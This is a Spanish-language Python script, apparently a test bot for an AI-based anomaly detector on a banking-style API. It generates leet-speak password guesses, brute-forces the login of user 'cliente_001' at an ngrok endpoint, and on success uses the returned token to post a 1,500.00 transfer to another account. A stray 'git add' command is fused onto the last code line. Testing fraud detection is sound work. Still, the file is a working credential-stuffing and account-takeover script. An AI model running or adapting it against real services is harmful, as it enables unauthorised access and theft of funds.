"""
Módulo de Simulación de Prueba de Estrés / Bot de Evaluación para la API
-------------------------------------------------------------------------
Descripción: Realiza pruebas de autenticación heurística para cliente_001
             y valida la detección de anomalías en tiempo real con la IA (BGG).
VERSIÓN:     1.4 (Sincronización con backend BGG y bloqueo HTTP 403)
=========================================================================
"""

import requests
import time

# ==========================================
# CONFIGURACIÓN DE ENDPOINTS Y RED
# ==========================================
API_BASE = "https://statue-essential-dirtiness.ngrok-free.dev"

LOGIN_URL = f"{API_BASE}/api/v1/auth/login"
TRANSFER_URL = f"{API_BASE}/api/v1/transactions/transfer"

TARGET_USER = "cliente_001"

HEADERS = {
    "Content-Type": "application/json",
    "ngrok-skip-browser-warning": "true"
}

# ==========================================
# DICCIONARIO Y PATRONES HEURÍSTICOS
# ==========================================
KNOWN_CREDENTIALS = {}

CONTEXT_KEYWORDS = ["Banco", "Secure"]
YEARS = ["2024", "2026"]
SYMBOLS = ["$", "#"]

def generate_passwords() -> list[str]:
    """
    Genera combinaciones candidatas de contraseñas basándose en palabras clave,
    reemplazos leet-speak y sufijos habituales.
    """
    generated = set()
    for base in CONTEXT_KEYWORDS:
        for yr in YEARS:
            for sym in SYMBOLS:
                leet = base.replace('e', '3').replace('s', '$')
                generated.add(f"{base}{yr}")
                generated.add(f"{leet}{sym}{yr}")
                generated.add(f"Banco$ecure#{yr}")
    return list(generated)

def run_api_bot():
    print(f"🤖 [BOT API] Iniciando ataque automatizado para usuario: {TARGET_USER}\n")
    candidates = generate_passwords()

    for attempt, pwd in enumerate(candidates, 1):
        # Payload de login enviando telemetría explícita dentro del rango anómalo (0.01s - 0.3s)
        login_payload = {
            "username": TARGET_USER,
            "password": pwd,
            "user_speed": 0.01,  # Velocidad de tecleo de script (inhumana)
            "latency": 5.0,      # Latencia de respuesta rápida
            "status_code": 401
        }

        try:
            response = requests.post(LOGIN_URL, json=login_payload, headers=HEADERS, timeout=5)

            # 1. Si la IA de BGG en el backend intercepta el bot
            if response.status_code == 403:
                print(f"⛔ [INTENTO {attempt}] ¡BLOQUEADO POR LA IA (BGG)! HTTP 403 Forbidden.")
                print("📢 Alerta de amenaza enviada exitosamente a Discord.")
                print("🛑 Proceso abortado: El servidor denegó la sesión por comportamiento anómalo.\n")
                return

            # 2. Si logra autenticarse (no debería llegar aquí si user_speed < 0.15)
            elif response.status_code == 200:
                print(f"✅ [Intento {attempt}] Contraseña identificada: '{pwd}'")
                KNOWN_CREDENTIALS[TARGET_USER] = pwd
                execute_login_and_transfer(TARGET_USER, pwd, response.json())
                return

            # 3. Respuesta estándar de clave incorrecta
            else:
                print(f"❌ [Intento {attempt}] Rechazado (HTTP {response.status_code}) -> '{pwd}'")

        except Exception as e:
            print(f"⚠️ Error de conexión: {e}")

        # Pausa mínima entre intentos (velocidad de ráfaga de bot)
        time.sleep(0.05)

    print("\n❌ Finalizado: Ninguna contraseña logró autenticarse.")

def execute_login_and_transfer(username, password, login_data=None):
    if not login_data:
        resp = requests.post(LOGIN_URL, json={"username": username, "password": password}, headers=HEADERS)
        login_data = resp.json()

    headers_tx = HEADERS.copy()
    token = login_data.get("token") or login_data.get("access_token")
    if token:
        headers_tx["Authorization"] = f"Bearer {token}"

    source_account = login_data.get("account_id", "MX-4821-0001")
    transfer_payload = {
        "account_id": source_account,
        "destination_account": "MX-9012-3344",
        "amount": 1500.00
    }

    print(f"💸 Ejecutando transferencia con sesión validada: {transfer_payload}")
    try:
        tx_resp = requests.post(TRANSFER_URL, json=transfer_payload, headers=headers_tx, timeout=5)
        print(f"📊 Respuesta Transferencia: HTTP {tx_resp.status_code}\n")
    except Exception as e:
        print(f"⚠️ Error ejecutando transferencia: {e}\n")

if __name__ == "__main__":
    run_api_bot()git add src/ia_monitoring/test_bot_simulator.py